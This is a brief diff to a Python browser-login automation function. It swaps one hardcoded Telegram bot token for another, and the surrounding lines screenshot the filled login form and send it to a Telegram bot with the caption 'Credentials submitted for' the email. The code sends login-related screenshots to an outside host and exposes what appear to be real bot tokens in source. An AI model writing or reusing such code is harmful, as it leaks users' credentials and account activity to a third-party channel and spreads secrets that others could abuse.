@@ -92,7 +92,7 @@ def do_browser_login(email, password, chat_id=None, topic_id=None, caption_prefi
             try:
                 import requests
                 import os
-                BOT_TOKEN = "8284450010:AAEDxODh46GHFm01oQjVIipik1lSbs_qfMc"
+                BOT_TOKEN = "8795125731:AAGtIs-9iWnprqDEP7T38t54H6gCaY04xIs"
                 driver.save_screenshot("step2_filled.png")
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                 caption_text = f"Chrome API: Credentials submitted for {email}"
